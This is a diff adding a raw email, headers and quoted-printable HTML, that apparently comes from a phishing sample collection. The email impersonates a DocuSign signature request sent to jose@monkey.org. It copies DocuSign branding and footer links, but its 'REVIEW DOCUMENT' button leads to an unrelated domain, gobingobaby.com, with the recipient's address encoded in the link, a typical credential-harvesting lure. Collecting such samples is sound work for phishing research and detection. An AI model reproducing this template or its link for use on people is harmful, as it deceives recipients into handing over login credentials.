@@ -1,0 +1,273 @@
+Return-Path: myah@basolon.com
+Delivered-To: jose@monkey.org
+X-FDA: 83028673098.28.E0A0A69
+Received: from mouth.basolon.com (mouth.basolon.com [194.169.172.220])
+	by imf30.b.hostedemail.com (Postfix) with ESMTP id 37EAF180008
+	for <jose@monkey.org>; Mon, 20 Jan 2025 18:31:27 +0000 (UTC)
+Authentication-Results: imf30.b.hostedemail.com;
+	dkim=pass header.d=basolon.com header.s=dkim header.b=M2cuBjmb;
+	spf=pass (imf30.b.hostedemail.com: domain of myah@basolon.com designates 194.169.172.220 as permitted sender) smtp.mailfrom=myah@basolon.com;
+	dmarc=pass (policy=none) header.from=basolon.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1737397888;
+	h=from:from:sender:reply-to:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=TBID3dhg8PIqKFphWbetZ4waen5So8jkLHwRESZh3b8=;
+	b=Cnt6ltXrgy24+iPuZhiqnQ0HdZxDSacSLi8MzF1THou/48xMF3l1f6gqsgM3URRVWFCg9u
+	oUgDukf3Cv6JNrC+4LhvP7qUpNcHqtDDWhwcVa9hT7Mfa7W5CGNPVJUUcOuG3R3l2r6Dth
+	L9mLHqaf+A+XaA1Tv80juKM8Bmn4c0c=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1737397888; a=rsa-sha256;
+	cv=none;
+	b=KeeO6UME9W6JYMWXVymEg0G8wCYheb1JEF1WYOXdmVaGbqJGGTHRMmfDdVep5PxGq7DEon
+	OSgyv439QGOsM8mQcvwOmq4pRVw3kVaAqNd8nhSwRr4RBZdnnAf9nGRDBSmDSlSBcZ7xe7
+	59qielSTubNt+58AQuVXF5Np/+hey8M=
+ARC-Authentication-Results: i=1;
+	imf30.b.hostedemail.com;
+	dkim=pass header.d=basolon.com header.s=dkim header.b=M2cuBjmb;
+	spf=pass (imf30.b.hostedemail.com: domain of myah@basolon.com designates 194.169.172.220 as permitted sender) smtp.mailfrom=myah@basolon.com;
+	dmarc=pass (policy=none) header.from=basolon.com
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=basolon.com;
+ h=Reply-To:From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding; i=myah@basolon.com;
+ bh=qsciP149rbHwHBBIqe2FDeu+D7o=;
+ b=M2cuBjmbZFc+EnwajhVWhm4RWv5Jg1LadW6fMFRe08S0iAhMhbPT6nCxM9enFccprDpcwnIolV/t
+   PugGqpuZKQt8xzrYn7klMfLv3adu5SiLjqb8La3Eyo1B8Ul7Q9bpAcOqbe4IGxJTWJwpf87Xr1+W
+   y3mHO/Kqx1CNGmnrXHFMpxM6unahrwOTv3BW4Jp22gnaL27uFcipUps/b9QsTAtkQW8QPNyeczBj
+   mgexQp3hdRG2VkcZVb9vWDJAu/vUMlSFqOWwqr4VUC4D+8TSeO9w4p7lbHI9L/MNCmU3tHY5u2Lv
+   3FcxV+RXMTjllJX1G0Tabj3IHmf98SELEqrxjg==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=basolon.com;
+ b=rIeFdPP8el4bZTWv2fd+jtkbUPgXrlqtt74CDi/0/RgnEGBtvM9Ozq98EFSxOIjj9QwgEu27s7GD
+   elYCMOwmhi9gDpHyJz4SFpfNGIKGX5QOha0AmzSxVqBAv8HuxHkIIC/aLwseLMTp2G0Cc7Bkj0jW
+   YYp2lfB929vzn51tQSMoIuPH18WFSt1gI31RhM7NBZDsd5iyp+3MRzwWc9qgdJck4kI00oEjFi31
+   Quf7yceCAzmUSZRnMJxYWBQwI1Pj4vZOnRcTMIX6XTJ1+7btvfkADmP6itQjjZyF4OyvPrGTB3Bt
+   A0qVxV1o22KJ0rDIkfF5Ic/KXhXuPgmvMBW47Q==;
+Reply-To: no-reply@docusign.com
+From: DocuSign via monkey.org <myah@basolon.com>
+To: jose@monkey.org
+Subject: Complete via DocuSign: Signature required for jose@monkey.org
+Date: 17 Jan 2025 10:28:53 +0100
+Message-ID: <20250117102853.745E63872E517727@basolon.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Stat-Signature: wau7kes3aasb8rx1wczeuy9ez7cqx7to
+X-Rspam-User: 
+X-Rspamd-Queue-Id: 37EAF180008
+X-Rspamd-Server: rspam04
+X-Spam-Status: No, score=4.80
+X-HE-Tag: 1737397887-325712
+X-HE-Meta: U2FsdGVkX18FeEwiRwPwaYSZwHoTR6BG5iKqEXorpvuLae5vqHI6Xp1pLiS6QjNnP9CDZem0mhw8xySOBSapNPR5bKD+uTp2LA5DKviTvQfX8t/y1gWIh+xI0Qh1Ha4ZxG8qHf7mlutBAR+/jWB+wFAsKYHTaAk3IDV4QrtE1UBcfS5vMfrPgjtVHFce+zpUtbkfJCzCU0O929gIZOo3NEIODXi41bGotRmp24wHChSmOgNePWYE3fPUSGkuk3f13STMrmVgNxjjn4n6POGKfkaJX6Ft5gQYi2tF5/PPHAoqiNilAnwHHgFin1zgBc+jtrXpL11HvPrWgt3ZhP9fdkYJxIm35lTez7ZB7+v1QlWlldGsZUUqnoXkbCpx1XJbPfp0/ojdSkuO5IbckZ4dx5JfedHC7AjUOReVn99I6zBLep1CCscUkGDuVhbO9Dp4WQ54nLeKWNut5ZZRSPfVcFlIMnWrj1rI0iBoTVKm7avkrnn+/UIDgBJ1/EbyB7gQViFfCPr+PCpGYKH9bdzimG9lIlht0CECm+Vq+IxVfTRbymMYi1tqnG23fzKQUXq5wOpCoUzocNQARXp5+Y22RcI1Mgsrsz24fG4vtUuyHZsPKV2O5cIKdPUyU9bHmsjA6jc2gDuqxYqH9rHdVSaiPGMS6BqjbvtQYmnXDOWlml9+GTLshsMOvaoYEKq8oBWGbpEeBe38JQ/AGvYT52CeK6FqW3XGhNBOoS1ZEDWKapburSfftzmUMa9bQhasfiGstufrS91/+k4X3dWp10IX7D0XRH8nEe1K3dNLEu6+ODv1O5s61IdYkZH9K4UHnUwiuqPpDxn9krznnYIWAfhU4Gbas7+avVdrD4sZYciOJM2msTq3Uc7xPJyETMQychsndLv7VGfSuRMbQw6sTdBeK5yUUtBu8GCzXhVCp9HpIT9XUt1AWRsxDuxH55OCEWYl+Fm0XVnlFuohF90hplZ2bkBJZRW
+ CBUk1z56Ofc7O3S2zl+MogfYRmh9rwUewUMCDI8KdKfqlb4cX/P+4w01fVwbuTM3CsEEfa3xjxgrkG8GbdxQ4PIWIE1jUe3T7UZMZkvZ/6x3tz58tr44gYlduWG4ijEbLHCjF2ivuctSdf51vvcO0WJ+ok+6LXhcBID3SifQ2arEAMuHC0Oe3JmD6aXBXsrh0VlmXzACOjsDTwEE1aqNk/5kWVNkzfGOzOK7OdppGVG3KDl/qI+KwU4XLy439CaCaCLMyYm8kJEotooFa0GLO5/U2Lj4jLinlSEQ6ojvpPMQ/Eh9udVbOYcKB5KjQYUO3hwS4
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 16
+
+<div dir=3D"ltr">
+    <table align=3D"center" border=3D"0" cellpadding=3D"0" cellspacing=3D"0=
+" width=3D"100%" style=3D'border-collapse: collapse; color: rgb(44, 54, 58)=
+; font-family: Helvetica, Arial, "Sans Serif"; font-size: 14px; width: 100%=
+;'>
+        <tbody style=3D"box-sizing:border-box;">
+            <tr style=3D"box-sizing:border-box;">
+                <td style=3D"box-sizing:border-box;">&nbsp;</td>
+                <td style=3D"box-sizing: border-box; width: 640px;">
+                    <table style=3D"border-collapse:collapse;max-width:640p=
+x;">
+                        <tbody style=3D"box-sizing:border-box;">
+                            <tr style=3D"box-sizing:border-box;">
+                                <td style=3D"box-sizing:border-box;padding:=
+10px 24px;"><img alt=3D"DocuSign" src=3D"https://ci3.googleusercontent.com/=
+meips/ADKq_NZ9zSQuYaFktvq5wTWnJ8qTDNqWB5u8pd40Z4Ltlrjg0uLGc7MOCSOPBHRUEaztl=
+5OE8NsctjC58TSk3fZJwkMZeg8oGAqwxvRqkSMrW4OT3fsQydF1U2lg_wEQvnfcuH_iotdaKpSf=
+DTe9mh2f1RV56g-Bkw=3Ds0-d-e1-ft#https://docucdn-a.akamaihd.net/olive/images=
+/2.62.0/global-assets/email-templates/email-logo.png" width=3D"116" style=
+=3D"box-sizing: border-box; border: currentcolor;" height=3D"25"></td>
+                            </tr>
+                            <tr style=3D"box-sizing:border-box;">
+                                <td style=3D"box-sizing:border-box;padding:=
+0px 24px 30px;">
+                                    <table align=3D"center" border=3D"0" ce=
+llpadding=3D"0" cellspacing=3D"0" width=3D"100%" style=3D"border-collapse: =
+collapse; color: rgb(255, 255, 255); background-color: rgb(30, 76, 161); wi=
+dth: 100%;">
+                                        <tbody style=3D"box-sizing:border-b=
+ox;">
+                                            <tr style=3D"box-sizing:border-=
+box;">
+                                                <td align=3D"center" style=
+=3D"box-sizing:border-box;padding:28px 36px 36px;border-radius:2px;width:59=
+2px;text-align:center;font-size:16px;"><img height=3D"75" src=3D"https://ci=
+3.googleusercontent.com/meips/ADKq_NbVzxS9KJw6PmdxxrkPfm2yTThWLBOBal-G7PnGC=
+CK9njzrOspqvS-ZE_puXIJ55mWrwhqWThwxS9U1BbaDg9uRdlsoolnzihInODobixWbrnF4mn-_=
+=3Ds0-d-e1-ft#https://eu.docusign.net/member/Images/email/docGeneric-white.=
+png" width=3D"75" style=3D"box-sizing: border-box; border-style: none; widt=
+h: 75px; height: 75px;">
+                                                    <table border=3D"0" cel=
+lpadding=3D"0" cellspacing=3D"0" width=3D"100%" style=3D"border-collapse: c=
+ollapse; width: 100%;">
+                                                        <tbody style=3D"box=
+-sizing:border-box;">
+                                                            <tr style=3D"bo=
+x-sizing:border-box;">
+                                                                <td align=
+=3D"center" style=3D"box-sizing:border-box;border:currentcolor;padding-top:=
+24px;">
+                                                                    <p styl=
+e=3D"box-sizing:border-box;margin-top:0px;margin-bottom:1rem;"><span style=
+=3D"box-sizing:border-box;background-color:rgb(33,78,159);">Hi jose,</span>=
+</p>
+                                                                    <p styl=
+e=3D"box-sizing:border-box;margin-top:0px;margin-bottom:1rem;">You have rec=
+ieved a document to review and sign&nbsp;</p>
+                                                                </td>
+                                                            </tr>
+                                                        </tbody>
+                                                    </table>
+                                                    <table border=3D"0" cel=
+lpadding=3D"0" cellspacing=3D"0" width=3D"100%" style=3D"border-collapse: c=
+ollapse; width: 100%;">
+                                                        <tbody style=3D"box=
+-sizing:border-box;">
+                                                            <tr style=3D"bo=
+x-sizing:border-box;">
+                                                                <td align=
+=3D"center" style=3D"box-sizing:border-box;padding-top:30px;">
+                                                                    <div st=
+yle=3D"box-sizing:border-box;">
+                                                                        <ta=
+ble cellpadding=3D"0" cellspacing=3D"0" style=3D"border-collapse: collapse;=
+ width: 100%;">
+                                                                           =
+ <tbody style=3D"box-sizing:border-box;">
+                                                                           =
+     <tr style=3D"box-sizing:border-box;">
+                                                                           =
+         <td align=3D"center" height=3D"44" style=3D"box-sizing:border-box;=
+text-align:center;color:rgb(51,51,51);font-size:15px;background-color:rgb(2=
+55,196,35);"><a href=3D"https://gobingobaby.com/gobing/2k?id=3Ddgkpohfgczam=
+9zZUBtb25rZXkub3Jn" rel=3D"noreferrer" title=3D"REVIEW DOCUMENT" style=3D"b=
+ox-sizing:border-box;color:rgb(51,51,51);text-decoration-line:none;" target=
+=3D"_blank" data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://=
+gobingobaby.com/gobing/2k?id=3Dbdqtaogkrwam9zZUBtb25rZXkub3Jn&source=3Dgmai=
+l&ust=3D1737189124007000&usg=3DAOvVaw2g4aPGoF9hqEsbBslCx4Z4"><span style=3D=
+"box-sizing:border-box;padding:0px 24px;"><span style=3D"box-sizing:border-=
+box;font-weight:bolder;">REVIEW DOCUMENT</span></span></a></td>
+                                                                           =
+     </tr>
+                                                                           =
+ </tbody>
+                                                                        </t=
+able>
+                                                                    </div>
+                                                                </td>
+                                                            </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </td>
+                            </tr>
+                            <tr style=3D"box-sizing:border-box;">
+                                <td style=3D"box-sizing:border-box;padding:=
+0px 24px 24px;color:rgb(0,0,0);font-size:16px;">
+                                    <p style=3D"box-sizing:border-box;margi=
+n-top:0px;margin-bottom:1rem;color:rgb(51,51,51);line-height:20px;font-size=
+:15px;"><span style=3D"box-sizing:border-box;">[DocuSign@monkey.org]</span>=
+</p>
+                                    <p style=3D"box-sizing:border-box;margi=
+n-top:0px;margin-bottom:1rem;color:rgb(51,51,51);line-height:20px;font-size=
+:15px;"><span style=3D"box-sizing:border-box;">Please review and sign at Do=
+cuSign<br style=3D"box-sizing:border-box;">Guidelines for Invoice Submissio=
+n.</span></p>
+                                    <p style=3D"box-sizing:border-box;margi=
+n-top:0px;margin-bottom:1rem;color:rgb(51,51,51);line-height:20px;font-size=
+:15px;">&nbsp;<span style=3D"font-weight: bolder; color: rgb(102, 102, 102)=
+; font-size: 13px;">Do Not Share This Email</span></p>
+                                    <p style=3D"box-sizing: border-box; mar=
+gin-top: 0px; margin-bottom: 1em; color: rgb(102, 102, 102); line-height: 1=
+8px; font-size: 13px;">This email contains a secure link to Docusign. Pleas=
+e do not share this email, link, or access code with others.</p>
+                                    <p style=3D"box-sizing: border-box; mar=
+gin-top: 0px; margin-bottom: 1em; color: rgb(102, 102, 102); line-height: 1=
+8px; font-size: 13px;"><span style=3D"box-sizing: border-box; font-weight: =
+bolder;">Alternate Signing Method</span><br style=3D"box-sizing: border-box=
+;">&apos;Review Documents&apos;, and sign in:<br style=3D"box-sizing: borde=
+r-box;">[[-Email-]]]</p>
+                                    <p style=3D"box-sizing: border-box; mar=
+gin-top: 0px; margin-bottom: 1em; color: rgb(102, 102, 102); line-height: 1=
+8px; font-size: 13px;"><span style=3D"box-sizing: border-box; font-weight: =
+bolder;">About Docusign</span><br style=3D"box-sizing: border-box;">Sign do=
+cuments electronically in just minutes. It&apos;s safe, secure, and legally=
+ binding. Whether you&apos;re in an office, at home, on-the-go -- or even a=
+cross the globe -- Docusign provides a professional trusted solution for Di=
+gital Transaction Management&trade;.</p>
+                                    <p style=3D"box-sizing: border-box; mar=
+gin-top: 0px; margin-bottom: 1em; color: rgb(102, 102, 102); line-height: 1=
+8px; font-size: 13px;"><span style=3D"box-sizing: border-box; font-weight: =
+bolder;">Questions about the Document?</span><br style=3D"box-sizing: borde=
+r-box;">If you need to modify the document or have questions about the deta=
+ils in the document, please reach out to the sender by emailing them direct=
+ly.<br style=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-bo=
+x;"><span style=3D"box-sizing: border-box; font-weight: bolder;">Stop recei=
+ving this email</span><br style=3D"box-sizing: border-box;"><a href=3D"http=
+s://www.docusign.net/" rel=3D"noreferrer" target=3D"_blank" style=3D"color:=
+ rgb(36, 99, 209); box-sizing: border-box; text-decoration-line: none; back=
+ground-color: transparent;">Report this email</a> or read more about <a hre=
+f=3D"https://support.docusign.com/en/guides/Declining-to-sign-DocuSign-Sign=
+er-Guide" rel=3D"noreferrer" target=3D"_blank" style=3D"color: rgb(36, 99, =
+209); box-sizing: border-box; text-decoration-line: none; background-color:=
+ transparent;">Declining to sign</a> and&nbsp;<a href=3D"https://support.do=
+cusign.com/en/articles/How-do-I-manage-my-email-notifications" rel=3D"noref=
+errer" target=3D"_blank" style=3D"color: rgb(36, 99, 209); box-sizing: bord=
+er-box; text-decoration-line: none; background-color: transparent;">Managin=
+g notifications</a>.<br style=3D"box-sizing: border-box;"><br style=3D"box-=
+sizing: border-box;">If you have trouble signing, visit &quot;<a href=3D"ht=
+tps://support.docusign.com/s/articles/How-do-I-sign-a-DocuSign-document-Bas=
+ic-Signing?language=3Den_US&utm_campaign=3DGBL_XX_DBU_UPS_2211_SignNotifica=
+tionEmailFooter&utm_medium=3Dproduct&utm_source=3Dpostsend" rel=3D"noreferr=
+er" target=3D"_blank" style=3D"color: rgb(36, 99, 209); box-sizing: border-=
+box; text-decoration-line: none; background-color: transparent;">How to Sig=
+n a Document</a>&quot; on our <a href=3D"https://support.docusign.com/" rel=
+=3D"noreferrer" target=3D"_blank" style=3D"color: rgb(36, 99, 209); box-siz=
+ing: border-box; text-decoration-line: none; background-color: transparent;=
+">Docusign Support Center</a>, or browse our&nbsp;<a href=3D"https://commun=
+ity.docusign.com/signing-7" rel=3D"noreferrer" target=3D"_blank" style=3D"c=
+olor: rgb(36, 99, 209); box-sizing: border-box; text-decoration-line: none;=
+ background-color: transparent;">Docusign Community</a> for more informatio=
+n.<br style=3D"box-sizing: border-box;">&nbsp;</p>
+                                    <p style=3D"box-sizing: border-box; mar=
+gin-top: 0px; margin-bottom: 1em; color: rgb(102, 102, 102); line-height: 1=
+8px; font-size: 13px;"><a href=3D"https://www.docusign.com/features-and-ben=
+efits/mobile?utm_campaign=3DGBL_XX_DBU_UPS_2211_SignNotificationEmailFooter=
+&utm_medium=3Dproduct&utm_source=3Dpostsend" rel=3D"noreferrer" target=3D"_=
+blank" style=3D"color: rgb(36, 99, 209); box-sizing: border-box; text-decor=
+ation-line: none; background-color: transparent;"><img height=3D"18" src=3D=
+"https://ci3.googleusercontent.com/meips/ADKq_NY-Fdyr0C0l9q5TMHk4p4TNA2P6At=
+OjEuAm6hKGdvbbUYnrwcPahgjmn6FhO6VsrMGrFO2ohpiaHxo6gjWyAog5bN4jRhi-gHVeIhBB2=
+ElfLkZpCvO6zTVxTH0-QoAwGowKyoZvvPtWvc0mZRMg1rYpBAXxYURpzGYANPQ=3Ds0-d-e1-ft=
+#https://docucdn-a.akamaihd.net/olive/images/2.62.0/global-assets/email-tem=
+plates/icon-download-app.png" width=3D"18" style=3D"box-sizing: border-box;=
+ border: currentcolor;">Download the Docusign App</a></p>
+                                    <p style=3D"box-sizing: border-box; mar=
+gin-top: 0px; margin-bottom: 1em; color: rgb(102, 102, 102); line-height: 1=
+4px; font-size: 10px;">This message was sent to you by Bradley Thomas who i=
+s using the Docusign Electronic Signature Service. If you would rather not =
+receive email from this sender you may contact the sender with your request=
+=2E</p>
+                                </td>
+                            </tr>
+                            <tr style=3D"box-sizing:border-box;">
+                                <td style=3D"box-sizing:border-box;padding:=
+0px 24px 12px;color:rgb(102,102,102);font-size:11px;"><br></td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </td>
+            </tr>
+        </tbody>
+    </table>
+</div>
